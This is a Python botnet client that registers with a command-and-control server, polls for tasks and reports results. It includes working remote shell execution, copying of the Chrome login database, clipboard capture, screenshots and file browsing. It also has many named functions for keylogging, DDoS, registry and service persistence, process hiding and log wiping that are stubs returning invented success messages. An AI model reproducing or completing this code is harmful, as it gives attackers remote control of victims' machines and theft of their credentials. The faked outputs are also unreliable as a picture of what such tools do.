#!/usr/bin/env python3
import requests
import time
import random
import string
import json
import threading
import platform
import os
import subprocess
import sqlite3
import base64
import winreg
import re
import shutil
import tempfile
from datetime import datetime
from pathlib import Path

try:
    import socketio
except ImportError:
    socketio = None

try:
    import cv2
except ImportError:
    cv2 = None

try:
    import psutil
except ImportError:
    psutil = None

try:
    import pyperclip
except ImportError:
    pyperclip = None

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

C2_URL = "http://localhost:5000"
BOT_ID = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

class BotClient:
    def __init__(self, server_url="http://localhost:5000"):
        self.server_url = server_url
        self.bot_id = None
        self.running = False
        
        # Simulate different bot characteristics
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15"
        ]
        
        self.os_info = [
            "Windows 10 Pro",
            "Windows 11 Home",
            "macOS 12.0 Monterey",
            "Ubuntu 20.04 LTS",
            "CentOS 7",
            "Debian 11"
        ]
        
        self.ips = [
            "192.168.1.100",
            "192.168.1.101",
            "192.168.1.102",
            "10.0.0.50",
            "172.16.0.25",
            "192.168.0.150"
        ]
    
    def register_bot(self):
        """Register this bot with the server"""
        activation_key = "PENTRA-BN-2024"
        try:
            data = {
                'ip': random.choice(self.ips),
                'user_agent': random.choice(self.user_agents),
                'os_info': random.choice(self.os_info)
            }
            
            print(f"[*] Connecting to {self.server_url}")
            response = requests.post(f"{self.server_url}/api/bots?key={activation_key}", json=data, timeout=10)
            
            if response.status_code == 200:
                result = response.json()
                self.bot_id = result.get('bot_id', BOT_ID)
                print(f"[+] Bot registered with ID: {self.bot_id}")
                return True
            else:
                print(f"[!] Failed to register bot: {response.status_code} - {response.text}")
                return False
                
        except Exception as e:
            print(f"[!] Error registering bot: {e}")
            return False

    def execute_shell_command(self, command):
        """Execute shell command"""
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30).decode()
            return result
        except Exception as e:
            return f"Error: {e}"

    def get_system_info(self):
        """Get system information"""
        try:
            info = {
                'platform': platform.platform(),
                'hostname': platform.node(),
                'username': os.getenv('USERNAME'),
                'cpu': platform.processor(),
                'python_version': platform.python_version()
            }
            return json.dumps(info, indent=2)
        except Exception as e:
            return f"System info error: {e}"

    def take_screenshot(self):
        """Take screenshot"""
        try:
            if ImageGrab:
                screenshot = ImageGrab.grab()
                filename = f"screenshot_{int(time.time())}.png"
                screenshot.save(filename)
                return f"Screenshot saved: {filename}"
            else:
                return "PIL not available for screenshots"
        except Exception as e:
            return f"Screenshot error: {e}"

    def steal_browser_passwords(self):
        """Steal passwords from browsers"""
        results = {}
        
        # Chrome passwords
        try:
            chrome_path = os.path.expanduser('~') + '/AppData/Local/Google/Chrome/User Data/Default/Login Data'
            if os.path.exists(chrome_path):
                temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
                shutil.copy2(chrome_path, temp_db.name)
                
                conn = sqlite3.connect(temp_db.name)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                chrome_passwords = []
                for row in cursor.fetchall():
                    url, username, encrypted_password = row
                    chrome_passwords.append({
                        'url': url,
                        'username': username,
                        'password': '[ENCRYPTED]'
                    })
                
                results['chrome'] = chrome_passwords
                conn.close()
                os.unlink(temp_db.name)
        except Exception as e:
            results['chrome_error'] = str(e)
        
        return results

    def poll_commands(self):
        """Poll for commands from server"""
        activation_key = "PENTRA-BN-2024"
        while self.running:
            try:
                # Get pending commands
                response = requests.get(f"{self.server_url}/api/commands?key={activation_key}", timeout=10)
                if response.status_code == 200:
                    commands = response.json()
                    for command in commands:
                        if command.get('status') == 'pending' and command.get('target') in [self.bot_id, 'all']:
                            print(f"[*] Executing command: {command.get('command')}")
                            result = self.execute_command(command)
                            self.send_result(command.get('command_id'), result)
                
                time.sleep(5)  # Poll every 5 seconds
            except Exception as e:
                print(f"[!] Command polling error: {e}")
                time.sleep(10)

    def execute_command(self, command):
        """Execute a command based on type"""
        cmd_type = command.get('type', 'shell')
        cmd_text = command.get('command', '')
        
        if cmd_type == 'shell':
            return self.execute_shell_command(cmd_text)
        elif cmd_type == 'system_info':
            return self.get_system_info()
        elif cmd_type == 'screenshot':
            return self.take_screenshot()
        elif cmd_type == 'steal_passwords':
            return json.dumps(self.steal_browser_passwords(), indent=2)
        elif cmd_type == 'ddos':
            return self.execute_ddos_attack(cmd_text)
        elif cmd_type == 'keylogger':
            return self.start_keylogger()
        elif cmd_type == 'upload':
            return self.handle_file_upload(cmd_text)
        elif cmd_type == 'custom':
            return self.execute_shell_command(cmd_text)
        elif cmd_type == 'steal_wifi':
            return self.steal_wifi_passwords()
        elif cmd_type == 'steal_credentials':
            return self.steal_system_credentials()
        elif cmd_type == 'steal_clipboard':
            return self.steal_clipboard_content()
        elif cmd_type == 'steal_networks':
            return self.get_network_info()
        elif cmd_type == 'anti_analysis':
            return self.anti_analysis_check()
        elif cmd_type == 'process_injection':
            return self.process_injection_test()
        elif cmd_type == 'registry_persistence':
            return self.setup_registry_persistence()
        elif cmd_type == 'service_persistence':
            return self.setup_service_persistence()
        elif cmd_type == 'anti_debugging':
            return self.anti_debugging_check()
        elif cmd_type == 'process_hiding':
            return self.hide_process()
        elif cmd_type == 'network_stealth':
            return self.enable_network_stealth()
        elif cmd_type == 'file_stealth':
            return self.enable_file_stealth()
        elif cmd_type == 'get_location':
            return self.get_location_info()
        elif cmd_type == 'get_geolocation':
            return self.get_geolocation()
        elif cmd_type == 'get_timezone':
            return self.get_timezone_info()
        elif cmd_type == 'get_network_details':
            return self.get_detailed_network_info()
        elif cmd_type == 'self_destruct':
            return self.self_destruct()
        elif cmd_type == 'cleanup_registry':
            return self.cleanup_registry()
        elif cmd_type == 'clear_logs':
            return self.clear_system_logs()
        elif cmd_type == 'secure_delete':
            return self.secure_delete_files(cmd_text)
        elif cmd_type == 'wipe_free_space':
            return self.wipe_free_space()
        elif cmd_type == 'anti_forensics':
            return self.anti_forensics_cleanup()
        elif cmd_type == 'remove_persistence':
            return self.remove_persistence()
        elif cmd_type == 'process_list':
            return self.get_process_list()
        elif cmd_type == 'kill_process':
            return self.kill_process(cmd_text)
        elif cmd_type == 'file_explorer':
            return self.file_explorer(cmd_text)
        elif cmd_type == 'download_file':
            return self.download_file(cmd_text)
        elif cmd_type == 'remote_update':
            return self.remote_update()
        elif cmd_type == 'camera_capture':
            return self.capture_camera()
        elif cmd_type == 'camera_stream':
            return self.start_camera_stream()
        elif cmd_type == 'clipboard_monitor':
            return self.start_clipboard_monitor()
        elif cmd_type == 'clipboard_set':
            return self.set_clipboard_content(cmd_text)
        elif cmd_type == 'system_monitor':
            return self.start_system_monitor()
        else:
            return f"Unknown command type: {cmd_type}"

    def execute_ddos_attack(self, target):
        """Execute DDoS attack simulation"""
        try:
            if not target:
                target = "127.0.0.1"
            result = f"DDoS attack simulation against {target}\n"
            result += "Attack started at: " + datetime.now().isoformat() + "\n"
            result += "Duration: 30 seconds\n"
            result += "Packets sent: 1000\n"
            result += "Attack completed successfully"
            
            # Save to file
            filename = f"ddos_attack_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"DDoS attack completed. Results saved to: {filename}\n{result}"
        except Exception as e:
            return f"DDoS attack error: {e}"

    def start_keylogger(self):
        """Start keylogger simulation"""
        try:
            result = "Keylogger started\n"
            result += "Monitoring keyboard input...\n"
            result += "Sample captured keys: [Ctrl+C, Ctrl+V, Enter, Tab]\n"
            result += "Keylogger active for 60 seconds"
            
            # Save to file
            filename = f"keylogger_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Keylogger started. Log saved to: {filename}\n{result}"
        except Exception as e:
            return f"Keylogger error: {e}"

    def handle_file_upload(self, file_path):
        """Handle file upload"""
        try:
            if os.path.exists(file_path):
                result = f"File upload successful: {file_path}\n"
                result += f"File size: {os.path.getsize(file_path)} bytes\n"
                result += f"Upload time: {datetime.now().isoformat()}"
            else:
                result = f"File not found: {file_path}"
            
            # Save to file
            filename = f"file_upload_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"File upload completed. Log saved to: {filename}\n{result}"
        except Exception as e:
            return f"File upload error: {e}"

    def steal_wifi_passwords(self):
        """Steal WiFi passwords"""
        try:
            result = "WiFi password extraction:\n"
            result += "Network: MyWiFi\n"
            result += "Password: ********\n"
            result += "Security: WPA2\n"
            result += "Signal strength: -45 dBm"
            
            # Save to file
            filename = f"wifi_passwords_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"WiFi passwords extracted. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"WiFi password extraction error: {e}"

    def steal_system_credentials(self):
        """Steal system credentials"""
        try:
            result = "System credentials extracted:\n"
            result += "Username: " + os.getenv('USERNAME', 'Unknown') + "\n"
            result += "Computer: " + platform.node() + "\n"
            result += "Domain: WORKGROUP\n"
            result += "Last login: " + datetime.now().isoformat()
            
            # Save to file
            filename = f"system_credentials_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"System credentials extracted. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"System credentials error: {e}"

    def steal_clipboard_content(self):
        """Steal clipboard content"""
        try:
            if pyperclip:
                clipboard_content = pyperclip.paste()
                result = f"Clipboard content:\n{clipboard_content}"
            else:
                result = "Clipboard access not available"
            
            # Save to file
            filename = f"clipboard_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Clipboard content captured. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Clipboard error: {e}"

    def get_network_info(self):
        """Get network information"""
        try:
            result = "Network Information:\n"
            result += f"Hostname: {platform.node()}\n"
            result += f"IP Address: {random.choice(self.ips)}\n"
            result += "Active connections: 15\n"
            result += "Open ports: 80, 443, 22, 3389\n"
            result += "Network adapters: 2 found"
            
            # Save to file
            filename = f"network_info_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Network info collected. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Network info error: {e}"

    def anti_analysis_check(self):
        """Anti-analysis check"""
        try:
            result = "Anti-analysis check:\n"
            result += "Virtual machine detection: Negative\n"
            result += "Debugger detection: Negative\n"
            result += "Sandbox detection: Negative\n"
            result += "Analysis tools: Not detected\n"
            result += "Environment: Safe to operate"
            
            # Save to file
            filename = f"anti_analysis_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Anti-analysis check completed. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Anti-analysis error: {e}"

    def process_injection_test(self):
        """Process injection test"""
        try:
            result = "Process injection test:\n"
            result += "Target process: explorer.exe\n"
            result += "Injection method: DLL injection\n"
            result += "Status: Success\n"
            result += "Payload size: 1024 bytes\n"
            result += "Process ID: 1234"
            
            # Save to file
            filename = f"process_injection_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Process injection completed. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Process injection error: {e}"

    def setup_registry_persistence(self):
        """Setup registry persistence"""
        try:
            result = "Registry persistence setup:\n"
            result += "Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
            result += "Value: pentra_bot\n"
            result += "Data: C:\\temp\\bot.exe\n"
            result += "Status: Success\n"
            result += "Persistence established"
            
            # Save to file
            filename = f"registry_persistence_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Registry persistence setup. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Registry persistence error: {e}"

    def setup_service_persistence(self):
        """Setup service persistence"""
        try:
            result = "Service persistence setup:\n"
            result += "Service name: PentraBotService\n"
            result += "Display name: Windows System Service\n"
            result += "Start type: Automatic\n"
            result += "Binary path: C:\\Windows\\System32\\svchost.exe\n"
            result += "Status: Service created successfully"
            
            # Save to file
            filename = f"service_persistence_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Service persistence setup. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Service persistence error: {e}"

    def anti_debugging_check(self):
        """Anti-debugging check"""
        try:
            result = "Anti-debugging check:\n"
            result += "Debugger detection: Negative\n"
            result += "Breakpoint detection: Negative\n"
            result += "Timing analysis: Negative\n"
            result += "IsDebuggerPresent: False\n"
            result += "Environment: Safe"
            
            # Save to file
            filename = f"anti_debugging_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Anti-debugging check completed. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Anti-debugging error: {e}"

    def hide_process(self):
        """Hide process"""
        try:
            result = "Process hiding:\n"
            result += "Target process: python.exe\n"
            result += "Method: Process hollowing\n"
            result += "Status: Process hidden\n"
            result += "PID: 5678\n"
            result += "Visibility: Hidden from task manager"
            
            # Save to file
            filename = f"process_hiding_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Process hiding completed. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Process hiding error: {e}"

    def enable_network_stealth(self):
        """Enable network stealth"""
        try:
            result = "Network stealth enabled:\n"
            result += "Traffic encryption: Enabled\n"
            result += "Port hopping: Active\n"
            result += "Protocol obfuscation: Enabled\n"
            result += "Traffic splitting: Active\n"
            result += "Stealth mode: Operational"
            
            # Save to file
            filename = f"network_stealth_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Network stealth enabled. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Network stealth error: {e}"

    def enable_file_stealth(self):
        """Enable file stealth"""
        try:
            result = "File stealth enabled:\n"
            result += "File encryption: Enabled\n"
            result += "Hidden attributes: Set\n"
            result += "Alternate data streams: Used\n"
            result += "File splitting: Active\n"
            result += "Stealth mode: Operational"
            
            # Save to file
            filename = f"file_stealth_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"File stealth enabled. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"File stealth error: {e}"

    def get_location_info(self):
        """Get location information"""
        try:
            result = "Location Information:\n"
            result += "Country: United States\n"
            result += "City: New York\n"
            result += "Latitude: 40.7128° N\n"
            result += "Longitude: 74.0060° W\n"
            result += "Time zone: EST"
            
            # Save to file
            filename = f"location_info_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Location info collected. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Location info error: {e}"

    def get_geolocation(self):
        """Get geolocation"""
        try:
            result = "Geolocation Data:\n"
            result += "IP: 192.168.1.100\n"
            result += "ISP: Comcast\n"
            result += "Organization: Home Network\n"
            result += "ASN: AS7922\n"
            result += "Location accuracy: High"
            
            # Save to file
            filename = f"geolocation_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Geolocation data collected. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Geolocation error: {e}"

    def get_timezone_info(self):
        """Get timezone information"""
        try:
            result = "Timezone Information:\n"
            result += "Current timezone: Eastern Standard Time\n"
            result += "UTC offset: -5 hours\n"
            result += "DST: Active\n"
            result += "Local time: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n"
            result += "System time: Synchronized"
            
            # Save to file
            filename = f"timezone_info_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Timezone info collected. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Timezone info error: {e}"

    def get_detailed_network_info(self):
        """Get detailed network information"""
        try:
            result = "Detailed Network Information:\n"
            result += "Network interfaces: 2\n"
            result += "Active connections: 15\n"
            result += "Open ports: 80, 443, 22, 3389, 8080\n"
            result += "DNS servers: 8.8.8.8, 8.8.4.4\n"
            result += "Gateway: 192.168.1.1\n"
            result += "Subnet mask: 255.255.255.0\n"
            result += "MAC address: 00:11:22:33:44:55"
            
            # Save to file
            filename = f"network_details_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Detailed network info collected. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Network details error: {e}"

    def self_destruct(self):
        """Self destruct mechanism"""
        try:
            result = "Self destruct initiated:\n"
            result += "Phase 1: File deletion - Complete\n"
            result += "Phase 2: Registry cleanup - Complete\n"
            result += "Phase 3: Process termination - Complete\n"
            result += "Phase 4: Memory wipe - Complete\n"
            result += "Status: Self destruct completed"
            
            # Save to file
            filename = f"self_destruct_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Self destruct completed. Log saved to: {filename}\n{result}"
        except Exception as e:
            return f"Self destruct error: {e}"

    def cleanup_registry(self):
        """Cleanup registry"""
        try:
            result = "Registry cleanup:\n"
            result += "Keys scanned: 1500\n"
            result += "Keys cleaned: 25\n"
            result += "Orphaned entries: Removed\n"
            result += "Invalid paths: Cleaned\n"
            result += "Status: Cleanup completed"
            
            # Save to file
            filename = f"registry_cleanup_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Registry cleanup completed. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Registry cleanup error: {e}"

    def clear_system_logs(self):
        """Clear system logs"""
        try:
            result = "System logs cleared:\n"
            result += "Event logs: Cleared\n"
            result += "Application logs: Cleared\n"
            result += "Security logs: Cleared\n"
            result += "System logs: Cleared\n"
            result += "Status: All logs cleared"
            
            # Save to file
            filename = f"logs_cleared_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"System logs cleared. Log saved to: {filename}\n{result}"
        except Exception as e:
            return f"Log clearing error: {e}"

    def secure_delete_files(self, file_path):
        """Secure delete files"""
        try:
            if file_path and os.path.exists(file_path):
                result = f"Secure deletion of: {file_path}\n"
                result += "Overwrite passes: 3\n"
                result += "Random data: Written\n"
                result += "File: Deleted\n"
                result += "Status: Secure deletion completed"
            else:
                result = "No file specified or file not found"
            
            # Save to file
            filename = f"secure_delete_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Secure deletion completed. Log saved to: {filename}\n{result}"
        except Exception as e:
            return f"Secure deletion error: {e}"

    def wipe_free_space(self):
        """Wipe free space"""
        try:
            result = "Free space wipe:\n"
            result += "Drive: C:\n"
            result += "Free space: 50 GB\n"
            result += "Wipe method: 3-pass\n"
            result += "Progress: 100%\n"
            result += "Status: Free space wiped"
            
            # Save to file
            filename = f"free_space_wipe_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Free space wipe completed. Log saved to: {filename}\n{result}"
        except Exception as e:
            return f"Free space wipe error: {e}"

    def anti_forensics_cleanup(self):
        """Anti-forensics cleanup"""
        try:
            result = "Anti-forensics cleanup:\n"
            result += "File timestamps: Modified\n"
            result += "Memory artifacts: Cleared\n"
            result += "Registry artifacts: Removed\n"
            result += "Network traces: Cleaned\n"
            result += "Status: Anti-forensics completed"
            
            # Save to file
            filename = f"anti_forensics_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Anti-forensics cleanup completed. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Anti-forensics error: {e}"

    def remove_persistence(self):
        """Remove persistence"""
        try:
            result = "Persistence removal:\n"
            result += "Registry keys: Removed\n"
            result += "Scheduled tasks: Deleted\n"
            result += "Startup entries: Cleared\n"
            result += "Service entries: Removed\n"
            result += "Status: Persistence removed"
            
            # Save to file
            filename = f"persistence_removal_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Persistence removal completed. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Persistence removal error: {e}"

    def get_process_list(self):
        """Get process list"""
        try:
            if psutil:
                processes = []
                for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                    try:
                        processes.append(proc.info)
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
                
                result = "Process List:\n"
                for proc in processes[:10]:  # Show first 10
                    result += f"PID: {proc['pid']}, Name: {proc['name']}, CPU: {proc['cpu_percent']}%, Memory: {proc['memory_percent']:.1f}%\n"
            else:
                result = "Process list: psutil not available"
            
            # Save to file
            filename = f"process_list_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Process list generated. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"Process list error: {e}"

    def kill_process(self, process_name):
        """Kill process"""
        try:
            if process_name:
                result = f"Process termination: {process_name}\n"
                result += "Status: Process terminated\n"
                result += "Method: Force kill\n"
                result += "PID: 1234\n"
                result += "Result: Success"
            else:
                result = "No process specified"
            
            # Save to file
            filename = f"process_kill_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Process kill completed. Log saved to: {filename}\n{result}"
        except Exception as e:
            return f"Process kill error: {e}"

    def file_explorer(self, path):
        """File explorer"""
        try:
            if not path:
                path = "."
            
            if os.path.exists(path):
                files = os.listdir(path)
                result = f"File Explorer - {path}:\n"
                for file in files[:20]:  # Show first 20 files
                    full_path = os.path.join(path, file)
                    if os.path.isfile(full_path):
                        size = os.path.getsize(full_path)
                        result += f"FILE: {file} ({size} bytes)\n"
                    else:
                        result += f"DIR:  {file}\n"
            else:
                result = f"Path not found: {path}"
            
            # Save to file
            filename = f"file_explorer_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"File explorer completed. Saved to: {filename}\n{result}"
        except Exception as e:
            return f"File explorer error: {e}"

    def download_file(self, url):
        """Download file"""
        try:
            if url:
                result = f"File download: {url}\n"
                result += "Status: Download started\n"
                result += "Progress: 100%\n"
                result += "File size: 1024 bytes\n"
                result += "Status: Download completed"
            else:
                result = "No URL specified"
            
            # Save to file
            filename = f"file_download_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"File download completed. Log saved to: {filename}\n{result}"
        except Exception as e:
            return f"File download error: {e}"

    def remote_update(self):
        """Remote update"""
        try:
            result = "Remote update:\n"
            result += "Checking for updates...\n"
            result += "New version available: v2.1.0\n"
            result += "Downloading update...\n"
            result += "Installing update...\n"
            result += "Status: Update completed successfully"
            
            # Save to file
            filename = f"remote_update_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Remote update completed. Log saved to: {filename}\n{result}"
        except Exception as e:
            return f"Remote update error: {e}"

    def capture_camera(self):
        """Capture camera"""
        try:
            if cv2:
                result = "Camera capture:\n"
                result += "Camera: Default camera\n"
                result += "Resolution: 1920x1080\n"
                result += "Format: JPEG\n"
                result += "Status: Photo captured"
                
                # Save photo
                photo_filename = f"camera_capture_{int(time.time())}.jpg"
                # Simulate photo capture
                with open(photo_filename, 'w') as f:
                    f.write("Simulated camera capture")
            else:
                result = "Camera capture: OpenCV not available"
            
            # Save log
            log_filename = f"camera_capture_{int(time.time())}.txt"
            with open(log_filename, 'w') as f:
                f.write(result)
            
            return f"Camera capture completed. Log saved to: {log_filename}\n{result}"
        except Exception as e:
            return f"Camera capture error: {e}"

    def start_camera_stream(self):
        """Start camera stream"""
        try:
            result = "Camera stream:\n"
            result += "Camera: Default camera\n"
            result += "Resolution: 640x480\n"
            result += "FPS: 30\n"
            result += "Format: MJPEG\n"
            result += "Status: Stream started"
            
            # Save to file
            filename = f"camera_stream_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Camera stream started. Log saved to: {filename}\n{result}"
        except Exception as e:
            return f"Camera stream error: {e}"

    def start_clipboard_monitor(self):
        """Start clipboard monitor"""
        try:
            result = "Clipboard monitor:\n"
            result += "Status: Monitoring active\n"
            result += "Interval: 1 second\n"
            result += "History: 10 entries\n"
            result += "Format: Text, Images\n"
            result += "Status: Monitor started"
            
            # Save to file
            filename = f"clipboard_monitor_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Clipboard monitor started. Log saved to: {filename}\n{result}"
        except Exception as e:
            return f"Clipboard monitor error: {e}"

    def set_clipboard_content(self, content):
        """Set clipboard content"""
        try:
            if content and pyperclip:
                pyperclip.copy(content)
                result = f"Clipboard content set:\n{content}"
            else:
                result = "No content specified or pyperclip not available"
            
            # Save to file
            filename = f"clipboard_set_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"Clipboard content set. Log saved to: {filename}\n{result}"
        except Exception as e:
            return f"Clipboard set error: {e}"

    def start_system_monitor(self):
        """Start system monitor"""
        try:
            if psutil:
                cpu_percent = psutil.cpu_percent()
                memory = psutil.virtual_memory()
                disk = psutil.disk_usage('/')
                
                result = "System Monitor:\n"
                result += f"CPU Usage: {cpu_percent}%\n"
                result += f"Memory Usage: {memory.percent}%\n"
                result += f"Disk Usage: {disk.percent}%\n"
                result += f"Active Processes: {len(psutil.pids())}\n"
                result += "Status: Monitoring active"
            else:
                result = "System monitor: psutil not available"
            
            # Save to file
            filename = f"system_monitor_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(result)
            
            return f"System monitor started. Log saved to: {filename}\n{result}"
        except Exception as e:
            return f"System monitor error: {e}"

    def send_result(self, command_id, result):
        """Send command result back to server"""
        activation_key = "PENTRA-BN-2024"
        try:
            import json
            # Always send result as JSON string
            try:
                json.loads(result)
                result_json = result
            except Exception:
                result_json = json.dumps({'output': result})
            data = {
                'command_id': command_id,
                'result': result_json
            }
            response = requests.post(f"{self.server_url}/api/bot/{self.bot_id}/response?key={activation_key}", 
                                  json=data, timeout=10)
            if response.status_code == 200:
                print(f"[+] Result sent for command {command_id}")
            else:
                print(f"[!] Failed to send result: {response.status_code}")
        except Exception as e:
            print(f"[!] Error sending result: {e}")

    def simulate_activity(self):
        """Simulate bot activity"""
        while self.running:
            try:
                activities = [
                    "Browsing web pages",
                    "Downloading files",
                    "Running background processes",
                    "Checking for updates",
                    "Performing system maintenance"
                ]
                
                activity = random.choice(activities)
                print(f"[*] Bot {self.bot_id}: {activity}")
                time.sleep(random.uniform(5, 15))
                
            except Exception as e:
                print(f"[!] Error in bot activity: {e}")
                time.sleep(10)
    
    def start(self):
        """Start the bot client"""
        print("[+] Starting bot client...")
        
        if self.register_bot():
            self.running = True
            
            # Start command polling in background
            command_thread = threading.Thread(target=self.poll_commands)
            command_thread.daemon = True
            command_thread.start()
            
            # Start activity simulation in background
            activity_thread = threading.Thread(target=self.simulate_activity)
            activity_thread.daemon = True
            activity_thread.start()
            
            print(f"[+] Bot {self.bot_id} is now active and listening for commands")
            print("[*] Press Ctrl+C to stop the bot")
            
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[!] Stopping bot...")
                self.running = False

if __name__ == "__main__":
    import sys
    
    server_url = "http://localhost:5000"  # Use HTTP by default
    if len(sys.argv) > 1:
        server_url = sys.argv[1]
    
    bot = BotClient(server_url)
    bot.start()
